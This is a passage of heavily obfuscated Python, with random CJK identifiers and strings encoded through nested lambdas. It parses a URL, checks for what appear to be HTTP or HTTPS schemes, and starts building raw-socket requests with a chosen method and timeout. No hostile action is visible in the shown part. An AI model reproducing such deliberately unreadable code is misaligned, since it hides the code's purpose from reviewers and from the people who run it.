                    url = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))()]))))())())().format(url)
                parsedResult = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))()]))))())())()).parse.urlparse(url)
                scheme, hostname, port, path, query = (parsedResult.scheme, parsedResult.hostname, parsedResult.port, parsedResult.path, parsedResult.query)
                if scheme != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))()]))))())())() and scheme != (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())():
                    raise 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).exceptions.InvalidSchema((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x10'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc0'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc0'))()]))))())())().format(url))
                port = port if port else (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/P'))() if parsedResult.scheme == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))()]))))())())() else (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\xbb'))()
                path = path if path else (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))()]))))())())()
                if query:
                    path = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))()]))))())())().format(path, query)

                def req(hostname: str, port: int, path: str, http_version: str, method: str, timeout):
                    try:
                        client = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x04'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())()).socket(襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x04'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())()).AF_INET, 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 